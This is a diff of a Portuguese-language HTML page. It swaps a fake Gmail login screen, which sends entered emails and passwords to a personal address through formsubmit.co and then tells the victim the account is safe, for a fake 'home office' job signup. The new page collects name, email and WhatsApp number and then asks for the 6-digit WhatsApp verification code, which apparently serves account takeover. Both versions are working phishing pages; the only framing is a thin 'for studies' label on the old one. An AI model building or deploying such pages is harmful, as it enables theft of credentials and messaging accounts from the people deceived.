@@ -3,114 +3,45 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Login Simulado - Gmail</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(to right, #4facfe, #00f2fe);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    .form-box, .success-box {
-      background-color: #fff;
-      padding: 40px;
-      border-radius: 12px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-      width: 100%;
-      max-width: 400px;
-      text-align: center;
-      display: none;
-    }
-    .active {
-      display: block;
-    }
-    .logo {
-      width: 90px;
-      margin-bottom: 30px;
-    }
-    input {
-      width: 100%;
-      padding: 14px;
-      margin: 10px 0 20px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      font-size: 15px;
-    }
-    button {
-      width: 100%;
-      padding: 14px;
-      background: #1a73e8;
-      border: none;
-      border-radius: 6px;
-      color: white;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    .footer {
-      font-size: 13px;
-      color: #777;
-      margin-top: 20px;
-    }
-    .success-box h2 {
-      color: #4CAF50;
-      margin-bottom: 20px;
-    }
-    .success-box p {
-      font-size: 16px;
-      color: #555;
-    }
-  </style>
+  <title>Cadastro Home Office</title>
 </head>
 <body>
 
-  <!-- Tela do formulário -->
-  <div class="form-box active" id="formulario">
-    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" alt="Logo Gmail" class="logo">
-    <form id="loginForm">
-      <input type="email" name="email" placeholder="Digite seu e-mail" required />
-      <input type="password" name="senha" placeholder="Digite sua senha" required />
-      <input type="hidden" name="_captcha" value="false">
-      <button type="submit">Avançar</button>
-    </form>
-    <div class="footer">Simulação visual para estudos.</div>
-  </div>
+  <!-- Formulário 1 -->
+  <h2>Entre para o grupo de Home Office</h2>
+  <p>Preencha com seus dados para participar:</p>
+  
+  <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" target="_blank">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_subject" value="Novo interessado - Página 1">
+    
+    <label>Nome:</label><br>
+    <input type="text" name="nome" required><br><br>
 
-  <!-- Tela de sucesso -->
-  <div class="success-box" id="sucesso">
-    <h2>Sua conta está segura</h2>
-    <p>Nenhuma atividade suspeita foi detectada.<br>Obrigado por verificar suas informações.</p>
-  </div>
+    <label>E-mail:</label><br>
+    <input type="email" name="email" required><br><br>
 
-  <script>
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-      e.preventDefault();
+    <label>WhatsApp:</label><br>
+    <input type="text" name="whatsapp" required><br><br>
 
-      const formData = new FormData(this);
+    <button type="submit">Enviar Dados</button>
+  </form>
 
-      fetch("https://formsubmit.co/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-      }).then(response => {
-        if (response.ok) {
-          document.getElementById("formulario").classList.remove("active");
-          document.getElementById("sucesso").classList.add("active");
-        } else {
-          alert("Erro ao enviar. Tente novamente.");
-        }
-      }).catch(() => {
-        alert("Erro de conexão.");
-      });
-    });
-  </script>
+  <hr><br>
+
+  <!-- Formulário 2 -->
+  <h2>Confirme sua Participação</h2>
+  <p>Digite o código de 6 dígitos enviado ao seu WhatsApp:</p>
+  
+  <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" target="_blank">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_subject" value="Código de Confirmação - Página 2">
+
+    <label>Código:</label><br>
+    <input type="text" name="codigo" maxlength="6" required><br><br>
+
+    <button type="submit">Confirmar Código</button>
+  </form>
 
 </body>
-  </html>
+</html>
